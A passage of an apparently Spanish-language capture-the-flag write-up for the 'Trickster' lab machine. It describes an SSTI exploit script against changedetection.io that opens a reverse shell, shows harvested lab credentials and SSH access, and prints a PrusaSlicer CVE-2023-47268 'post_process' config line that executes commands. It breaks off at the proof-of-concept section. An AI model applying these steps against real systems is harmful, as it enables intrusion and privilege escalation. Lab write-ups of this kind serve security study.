    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--url'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Base URL of the target site'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Port for the listener'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">4444</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--ip'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'IP address for the listener'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--notification'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Notification url if you don\'t want to use the system default'</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>


    add_detection<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> args<span class="token punctuation">.</span>notification<span class="token punctuation">)</span>
    start_listener<span class="token punctuation">(</span>args<span class="token punctuation">.</span>port<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Configuración del Listener:</strong>
<ul>
<li data-line="1" dir="auto">Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.</li>
</ul>
</li>
<li data-line="2" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Obtención del Token CSRF:</strong>
<ul>
<li data-line="3" dir="auto">Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.</li>
</ul>
</li>
<li data-line="4" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Creación de una Nueva Detección:</strong>
<ul>
<li data-line="5" dir="auto">Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.</li>
<li data-line="6" dir="auto">Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.</li>
</ul>
</li>
<li data-line="7" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Inyección de Código Malicioso:</strong>
<ul>
<li data-line="8" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:
<ul>
<li data-line="9" dir="auto">Itera sobre las clases base del sistema Python.</li>
<li data-line="10" dir="auto">Busca una clase con "warning" en su nombre.</li>
<li data-line="11" dir="auto">Utiliza esta clase para importar y ejecutar comandos del sistema operativo.</li>
<li data-line="12" dir="auto">Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando <code>python3</code> y <code>bash</code>.</li>
</ul>
</li>
</ul>
</li>
<li data-line="13" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Envío del Payload:</strong>
<ul>
<li data-line="14" dir="auto">Guarda la configuración maliciosa enviando otra solicitud POST.</li>
<li data-line="15" dir="auto">Esto activa el payload SSTI en el servidor vulnerable.</li>
</ul>
</li>
<li data-line="16" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Recepción de la Conexión Inversa:</strong>
<ul>
<li data-line="17" dir="auto">El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.</li>
<li data-line="18" dir="auto">El atacante obtiene acceso interactivo a la shell del servidor.</li>
</ul>
</li>
</ol></div><div class="el-p"><p dir="auto">El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs</p></div><div class="el-p"><p dir="auto">Y es que el endpoint <code>/login?next=/</code> Nos devuelve un 500 INTERNAL SERVER ERROR<br>
<span alt="Pasted image 20250214124302.png" src="Pasted image 20250214124302.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"></span></p></div><div class="el-p"><p dir="auto">Pruebo a logearme con las credenciales de james <code>alwaysandforever</code><br>
Y entramos;<br>
<span alt="Pasted image 20250214125118.png" src="Pasted image 20250214125118.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"></span></p></div><div class="el-p"><p dir="auto">Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  backdump <span class="token function">ls</span>
b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
b86f1003-3ecb-4125-b090-27e15ca605b9
<span class="token operator">|</span>-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
<span class="token operator">|</span>-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
<span class="token operator">|</span>-- ce6278706b3912f01bf5355004eb538a.txt.br
<span class="token operator">|</span>-- cf0c62552e4672c2326c0ef0489883c8.txt.br
<span class="token operator">|</span>-- d589415eb5dbd392fa8874829ce30450.txt.br
<span class="token operator">|</span>-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
`-- history.txt

<span class="token number">1</span> directory, <span class="token number">7</span> files
➜  backdump <span class="token function">cat</span> b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   <span class="token number">1</span>   │ <span class="token number">1725049268</span>,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
   <span class="token number">2</span>   │ <span class="token number">1725093859</span>,7fa5d9292139604c79d87fb69f21ffe2.txt.br
   <span class="token number">3</span>   │ <span class="token number">1725955071</span>,d589415eb5dbd392fa8874829ce30450.txt.br
   <span class="token number">4</span>   │ <span class="token number">1726233055</span>,cf0c62552e4672c2326c0ef0489883c8.txt.br
   <span class="token number">5</span>   │ <span class="token number">1726596196</span>,ce6278706b3912f01bf5355004eb538a.txt.br
   <span class="token number">6</span>   │ <span class="token number">1726746285</span>,3855b43e05c02a09c0b63be14f70a8bb.txt.br
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump <span class="token function">cat</span> url-list.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: url-list.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   <span class="token number">1</span>   │ https://news.ycombinator.com/
   <span class="token number">2</span>   │ https://changedetection.io/CHANGELOG.txt
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump <span class="token function">cat</span> secret.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secret.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   <span class="token number">1</span>   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="STTi p2" dir="auto" class="heading" id="STTi_p2"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>STTi p2</h2><div class="heading-children"><div class="el-p"><p dir="auto">En el exploit de Python anterior, vimos la existencia de una flag llamada “<em>–notification</em>”, identificamos en el pie del campo “<em>Notification Body</em>” que usa <strong>Jinja2</strong>, esto nos permite ejecutar ataques de tipo <em>SSTI</em> (<em>Server-Side Template Injection</em>), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “<em>Send test notification</em>”:</p></div><div class="el-p"><p dir="auto">Recibimos conexion con el servidor mandando una peticion por notification<br>
<span alt="Pasted image 20250214130533.png" src="Pasted image 20250214130533.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"></span><br>
Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250214130827.png" src="Pasted image 20250214130827.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"></span></p></div><div class="el-p"><p dir="auto">Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">root@a4b9a36ae7ff:/datastore/Backups<span class="token comment"># python -m http.server 2000</span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">2000</span> <span class="token punctuation">(</span>http://0.0.0.0:20
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250214131310.png" src="Pasted image 20250214131310.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"></span></p></div><div class="el-p"><p dir="auto">Dentro de los backups encontramos estos archivos .br;</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250214174849.png" src="Pasted image 20250214174849.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"></span></p></div><div class="el-p"><p dir="auto">Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
total 16K
drwxrwxr-x <span class="token number">2</span> kali kali <span class="token number">4</span>,0K ago <span class="token number">31</span> <span class="token number">10</span>:50 <span class="token builtin class-name">.</span>
drwxrwxr-x <span class="token number">3</span> kali kali <span class="token number">4</span>,0K feb <span class="token number">14</span> <span class="token number">13</span>:14 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> kali kali <span class="token number">2</span>,6K ago <span class="token number">31</span> 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
-rw-r--r-- <span class="token number">1</span> kali kali   <span class="token number">51</span> ago <span class="token number">31</span> 01:47 history.txt
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli <span class="token parameter variable">-d</span> f04f0732f120c0cc84a993ad99decb2c.txt.br
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 <span class="token function">ls</span>
f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">en el archivo de texto encontramos la password del usuario Adam<br>
<span alt="Pasted image 20250214175709.png" src="Pasted image 20250214175709.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"></span></p></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="User Adam" dir="auto" class="heading" id="User_Adam">User Adam</h1><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 <span class="token function">cat</span> <span class="token parameter variable">--plain</span> f04f0732f120c0cc84a993ad99decb2c.txt <span class="token operator">|</span> <span class="token function">grep</span> password
                <span class="token string">'database_password'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'adam_admin992'</span> ,                                                                                                               
                <span class="token string">'mailer_password'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> NULL ,                                                                                                                            
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 <span class="token function">ssh</span> adam@trickster.htb
adam@trickster.htb's password: 
adam@trickster:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>adam<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>adam<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>adam<span class="token punctuation">)</span>
adam@trickster:~$ <span class="token function">whoami</span>
adam
adam@trickster:~$ 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Adam puede usar sudo en :</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">adam@trickster:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> adam on trickster:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /opt/PrusaSlicer/prusaslicer
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras 3D;<br>
<span alt="Pasted image 20250214181500.png" src="Pasted image 20250214181500.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"></span></p></div><div class="el-p"><p dir="auto">Le realizamos un string </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer <span class="token operator">|</span> <span class="token function">grep</span> print
sprintf
fprintf
appimage_print_binary
appimage_print_hex
print_help
  --appimage-mount                Mount embedded filesystem image and print

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
<span class="token environment constant">DISPLAY</span> not set, GUI mode not available.

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r <span class="token punctuation">(</span>with GUI support<span class="token punctuation">)</span>
https://github.com/prusa3d/PrusaSlicer

Usage: prusa-slicer <span class="token punctuation">[</span> ACTIONS <span class="token punctuation">]</span> <span class="token punctuation">[</span> TRANSFORM <span class="token punctuation">]</span> <span class="token punctuation">[</span> OPTIONS <span class="token punctuation">]</span> <span class="token punctuation">[</span> file.stl <span class="token punctuation">..</span>. <span class="token punctuation">]</span>

Actions:
 --export-3mf        Export the model<span class="token punctuation">(</span>s<span class="token punctuation">)</span> as 3MF.
 --export-amf        Export the model<span class="token punctuation">(</span>s<span class="token punctuation">)</span> as AMF.
 --export-gcode, --gcode, <span class="token parameter variable">-g</span>
                     Slice the model and <span class="token builtin class-name">export</span> toolpaths as G-code.
 --export-obj        Export the model<span class="token punctuation">(</span>s<span class="token punctuation">)</span> as OBJ.
 --export-sla, <span class="token parameter variable">--sla</span> Slice the model and <span class="token builtin class-name">export</span> SLA printing layers as PNG.
 --export-stl        Export the model<span class="token punctuation">(</span>s<span class="token punctuation">)</span> as STL.
 <span class="token parameter variable">--gcodeviewer</span>       Visualize an already sliced and saved G-code
 --help, <span class="token parameter variable">-h</span>          Show this help.
 --help-fff          Show the full list of print/G-code configuration options.
 --help-sla          Show the full list of SLA print configuration options.
 <span class="token parameter variable">--info</span>              Write information about the model to the console.
 --opengl-debug      Activate OpenGL debug output on graphic cards <span class="token function">which</span> support it
 --opengl-version ABCD
                     Select a specific version of OpenGL
 <span class="token parameter variable">--save</span> ABCD         Save configuration to the specified file.
 --slice, <span class="token parameter variable">-s</span>         Slice the model as FFF or SLA based on the printer_technology configuration
                     value.

Transform options:
 --align-xy X,Y      Align the model to the given point.
 <span class="token parameter variable">--center</span> X,Y        Center the print around the given center.
 <span class="token parameter variable">--cut</span> N             Cut model at the given Z.
 --delete-after-load ABCD
                     Delete files after loading.
 --dont-arrange      Do not rearrange the given models before merging and keep their original XY
                     coordinates.
 <span class="token parameter variable">--duplicate</span> N       Multiply copies by this factor.
 --duplicate-grid X,Y
                     Multiply copies by creating a grid.
 --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
                     use --no-ensure-on-bed to disable.
 --merge, <span class="token parameter variable">-m</span>         Arrange the supplied models <span class="token keyword">in</span> a plate and merge them <span class="token keyword">in</span> a single model <span class="token keyword">in</span> order
                     to perform actions once.
 <span class="token parameter variable">--repair</span>            Try to repair any non-manifold meshes <span class="token punctuation">(</span>this option is implicitly added whenever
                     we need to slice the model to perform the requested action<span class="token punctuation">)</span>.
 <span class="token parameter variable">--rotate</span> N          Rotation angle around the Z axis <span class="token keyword">in</span> degrees.
 --rotate-x N        Rotation angle around the X axis <span class="token keyword">in</span> degrees.
 --rotate-y N        Rotation angle around the Y axis <span class="token keyword">in</span> degrees.
 <span class="token parameter variable">--scale</span> N           Scaling factor or percentage.
 --scale-to-fit X,Y,Z
                     Scale to fit the given volume.
 <span class="token parameter variable">--split</span>             Detect unconnected parts <span class="token keyword">in</span> the given model<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token function">split</span> them into separate
                     objects.

Other options:
 --config-compatibility
                     This version of PrusaSlicer may not understand configurations produced by the
                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
                     of supported firmware flavors. One may decide to bail out or to substitute an
                     unknown value with a default silently or verbosely. <span class="token punctuation">(</span>disable, enable,
                     enable_silent<span class="token punctuation">;</span> default: <span class="token builtin class-name">enable</span><span class="token punctuation">)</span>
 <span class="token parameter variable">--datadir</span> ABCD      Load and store settings at the given directory. This is useful <span class="token keyword">for</span> maintaining
                     different profiles or including configurations from a network storage.
 --ignore-nonexistent-config
                     Do not fail <span class="token keyword">if</span> a <span class="token function">file</span> supplied to <span class="token parameter variable">--load</span> does not exist.
 <span class="token parameter variable">--load</span> ABCD         Load configuration from the specified file. It can be used <span class="token function">more</span> than once to
                     load options from multiple files.
 <span class="token parameter variable">--loglevel</span> N        Sets logging sensitivity. <span class="token number">0</span>:fatal, <span class="token number">1</span>:error, <span class="token number">2</span>:warning, <span class="token number">3</span>:info, <span class="token number">4</span>:debug, <span class="token number">5</span>:trace
                     For example. <span class="token assign-left variable">loglevel</span><span class="token operator">=</span><span class="token number">2</span> logs fatal, error and warning level messages.
 <span class="token parameter variable">--output</span> ABCD, <span class="token parameter variable">-o</span> ABCD
                     The <span class="token function">file</span> where the output will be written <span class="token punctuation">(</span>if not specified, it will be based on
                     the input <span class="token function">file</span><span class="token punctuation">)</span>.
 --single-instance   If enabled, the <span class="token builtin class-name">command</span> line arguments are sent to an existing instance of GUI
                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
                     <span class="token string">"single_instance"</span> configuration value from application preferences.

Print options are processed <span class="token keyword">in</span> the following order:
  <span class="token number">1</span><span class="token punctuation">)</span> Config keys from the <span class="token builtin class-name">command</span> line, <span class="token keyword">for</span> example --fill-pattern<span class="token operator">=</span>stars
     <span class="token punctuation">(</span>highest priority, overwrites everything below<span class="token punctuation">)</span>
  <span class="token number">2</span><span class="token punctuation">)</span> Config files loaded with <span class="token parameter variable">--load</span>
  <span class="token number">3</span><span class="token punctuation">)</span> Config values loaded from amf or 3mf files

Run --help-fff / --help-sla to see the full listing of print options.

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">La version del programa es vulnerable ; (PrusaSlicer-2.6.1)<br>
Vemos que se puede ejecutar código arbitrario observando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="CVE-2023-47268" dir="auto" class="heading" id="CVE-2023-47268"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>CVE-2023-47268</h3><div class="heading-children"><div class="el-p"><p dir="auto">Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:</p></div><div class="el-pre"><pre><code data-line="0">For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">El exploit  permite la ejecución de código arbitrario al manipular el archivo <code>Slic3r_PE.config</code> dentro de un proyecto <code>.3mf</code> de PrusaSlicer.</p></div><div class="el-p"><p dir="auto">El archivo <code>Slic3r_PE.config</code> es donde se define la configuración del proyecto y contiene la entrada <code>post_process</code>, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .</p></div><div class="el-p"><p dir="auto">Slic3r_PE.config:</p></div><div class="el-pre"><pre class="language-config" tabindex="0"><code data-line="0" class="language-config is-loaded">; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Poc" dir="auto" class="heading" id="Poc"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Poc</h2><div class="heading-children"><div class="el-p"><p dir="auto">En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
